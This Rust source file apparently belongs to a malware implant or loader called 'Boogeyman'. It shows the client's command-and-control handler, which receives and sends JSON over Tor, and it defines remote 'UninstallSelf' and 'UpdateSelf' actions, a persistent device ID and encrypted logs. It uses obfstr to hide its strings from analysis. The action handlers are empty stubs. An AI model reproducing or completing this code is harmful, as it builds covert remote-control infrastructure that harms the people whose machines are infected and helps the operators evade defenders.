use std::path::PathBuf;
use anyhow::{ Context, Result };
use client_vars::{
    constants::client_version,
    types::{
        receive::{ self, BoogeymanReceivePayload },
        send::{ BoogeymanSendPayload, ServerAction, ServerParams },
    },
};
use shared::network::tor::{ ServerReceiveType, TorHandler };
use obfstr::obfstr as s;

pub struct BoogeymanTorHandler {
    tor_handler: TorHandler,
}

impl BoogeymanTorHandler {
    pub async fn new(log_directory: PathBuf, log_encryption_key: String) -> Result<Self> {
        let tor_handler = TorHandler::new(log_directory, log_encryption_key).await?;
        Ok(BoogeymanTorHandler { tor_handler })
    }

    pub async fn run_handler(&mut self) {
        self.tor_handler.run(|handler, data| { Self::process_data(handler.clone(), data) }).await;
    }

    fn process_data(tor_handler: TorHandler, binary_data: Vec<u8>) -> Result<()> {
        let processed_data: BoogeymanReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data)
    }

    fn route_data(tor_handler: TorHandler, processed_data: BoogeymanReceivePayload) -> Result<()> {
        match processed_data.action {
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
        }
        Ok(())
    }
    fn send_data(
        tor_handler: &mut TorHandler,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        let payload = BoogeymanSendPayload {
            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
            version: client_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(ServerReceiveType::Boogeyman, binary_data)
    }
}
